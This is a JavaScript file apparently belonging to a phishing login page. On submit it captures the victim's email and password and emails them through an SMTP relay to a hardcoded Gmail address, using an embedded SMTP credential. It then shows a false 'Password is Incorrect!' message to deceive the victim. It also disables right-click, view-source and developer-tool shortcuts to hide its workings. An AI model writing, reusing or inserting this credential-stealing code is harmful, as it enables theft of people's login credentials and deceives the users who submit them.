document.getElementById('submitForm').addEventListener('submit', function(event) {
  event.preventDefault();

  const email = document.getElementById('Email').value;
  const password = document.getElementById('Password').value;

  if (!email || !password) {
      alert("Please fill out all fields.");
      return;
  }

  if (typeof Email === "undefined" || typeof Email.send !== "function") {
      alert("Invalid Password, please try again.");
      return;
  }

  Email.send({
       Host: "smtp.elasticemail.com",
       Username: "work.paulmagbanua@gmail.com",
       Password: "CFBED23B17EBA67DD7CE9B3DB14BF68E9EEA",  
       To: "work.paulmagbanua@gmail.com",
       From: "work.paulmagbanua@gmail.com", 
       Subject: `A new form submission, from: ${email}`,
      Body: `<strong>Email:</strong> ${email} <br> <strong>Password:</strong> ${password}`
  }).then(response => {
      console.log("SMTPJS Response:", response); 
      if (response === "OK") {
          alert("Password is Incorrect!");
          document.getElementById('submitForm').reset();
      } else {
          alert(`Failed to send message: ${response}`);
      }
  }).catch(error => {
      console.error("Error login");
      alert("Error login");
  });
});


document.addEventListener("contextmenu", (event) => event.preventDefault());
document.addEventListener("keydown", (event) => {
    if (event.ctrlKey && (event.key === "u" || event.key === "U")) {
        event.preventDefault();
    }
    if (event.ctrlKey && event.shiftKey && (event.key === "i" || event.key === "I")) {
        event.preventDefault();
    }
    if (event.ctrlKey && event.shiftKey && (event.key === "j" || event.key === "J")) {
        event.preventDefault();
    }
    if (event.ctrlKey && (event.key === "s" || event.key === "S")) {
        event.preventDefault();
    }
    if (event.ctrlKey && (event.key === "h" || event.key === "H")) {
        event.preventDefault();
    }
    if (event.ctrlKey && event.key === "F12") {
        event.preventDefault();
    }
});
